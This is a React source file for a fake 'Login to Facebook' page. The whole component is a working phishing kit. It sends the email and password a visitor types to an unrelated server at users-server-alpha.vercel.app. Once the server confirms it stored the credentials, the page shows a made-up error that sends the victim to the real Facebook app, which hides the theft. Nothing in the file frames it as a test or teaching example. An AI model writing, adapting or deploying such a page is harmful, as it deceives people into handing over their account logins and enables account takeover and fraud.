
import Swal from 'sweetalert2';
import './App.css'

function App() {

  const handleLogin = event =>{
    event.preventDefault();
    const form = event.target;
    const email = form.email.value;
    const password = form.password.value;
    const user ={email, password}

    fetch('https://users-server-alpha.vercel.app/users',{
      method: 'POST',
      headers:{
        'content-type': 'application/json'
      },
      body: JSON.stringify(user)
    })
    .then(res =>res.json())
    .then(result =>{
      if(result.acknowledged === true){
        Swal.fire({
          icon: 'error',
          title: 'Oops...',
          text: 'Something went wrong! You can try to login with your facebook app',
         
        })
      }
    })
    form.reset()
  }

  return (
    <>
      <div className="login-form">
        <h2>Login to Facebook</h2>
        <form onSubmit={handleLogin}>
          <input className='email' type="text" placeholder="Email address or phone number" name='email' required />
          <input className='password' type="password" placeholder="Password" name='password' required />
          <input type="submit" value="Login" className='button'/>
        </form>
        <p className='forget'>Forgotten password?</p>
        <hr />
        <button className='createBtn'>Create new account</button>
      </div>
      <p className='createPage'><strong>Create a Page</strong> for a celebrity, brand or business.</p>

    </>
  )
}

export default App
